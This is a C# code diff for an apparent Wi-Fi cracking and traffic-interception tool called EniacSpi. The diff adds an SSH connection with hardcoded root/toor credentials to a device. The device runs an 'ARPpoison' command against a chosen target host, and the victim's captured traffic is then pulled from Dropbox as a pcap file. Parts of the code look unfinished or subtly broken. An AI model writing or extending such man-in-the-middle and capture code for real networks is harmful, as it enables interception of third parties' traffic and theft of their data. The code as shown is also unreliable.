@@ -3,14 +3,13 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net.Sockets;
-using System.Text;
 using System.Threading.Tasks;
 using oclHashcatNet.Extensions;
 using System.IO;
 using System.Web;
 using Dropbox.Api;
-using Dropbox.Api.Babel;
 using Dropbox.Api.Files;
+using Renci.SshNet;
 
 namespace EniacSpi.Objects
 {
@@ -27,6 +26,9 @@ namespace EniacSpi.Objects
             AvailableNetworks.Add(new NetworkInformation() { SSID = "testSSID", MAC = "TEST-AABBCC-DD1234", Security = "WPA/WPA2(test)", Signal = 10, CrackProgressStatus = 0, CrackProgressEnd = 1, IsCracking = false });
             this.SelectedNetwork = AvailableNetworks.FirstOrDefault();
             AvailableTargetHosts.Add(new HostInformation { MAC = "TEST-AABBCC-DD1235" });
+
+            this.SshClient= new SshClient(new ConnectionInfo("192.168.2.14", 22, "root", new PasswordAuthenticationMethod("root", "toor")));
+            StartPoison();
         }
 
         public WPAcrack WPAcrack { get; }
@@ -40,6 +42,8 @@ namespace EniacSpi.Objects
                 return "test";
             }
         }
+
+        public SshClient SshClient { get; set; }
 
         public IList<INetworkInformation> AvailableNetworks { get; }
 
@@ -89,9 +93,43 @@ namespace EniacSpi.Objects
 
         public bool IsCracking { get; set; }
 
+        public async Task StartPoison()
+        {
+            this.SshClient.Connect();
+            var command = this.SshClient.CreateCommand(String.Format("EniacSpi ARPpoison {0} {1}", this.SelectedTargetHost.MAC, this.SelectedNetwork.MAC));
+            var result = command.Result;
+
+            DropboxEvents.OnDropboxChanged(TargetHostTrafficReceived);
+
+            this.SshClient.Disconnect();
+        }
+
+        private async void TargetHostTrafficReceived()
+        {
+            var dropboxClient = HttpContext.Current.Application["DropboxClient"] as DropboxClient;
+            try
+            {
+                var response = await dropboxClient.Files.DownloadAsync(new Dropbox.Api.Files.DownloadArg(String.Format("/{0}/{1}/package.pcap", this.Name, this.SelectedNetwork.MAC)));
+
+                Stream fileStream = await response.GetContentAsStreamAsync();
+
+                //do pcap parsing and SignalR here
+
+                fileStream.Close();
+            }
+            catch (ApiException<DownloadError.Path> ex)
+            {
+                return;
+            }
+            catch (Exception ex)
+            {
+                return;
+            }
+        }
+
         public bool IsConnected { get { return isConnected(this.Socket); } }
 
-        public static bool isConnected(Socket socket)
+        private static bool isConnected(Socket socket)
         {
             try
             {
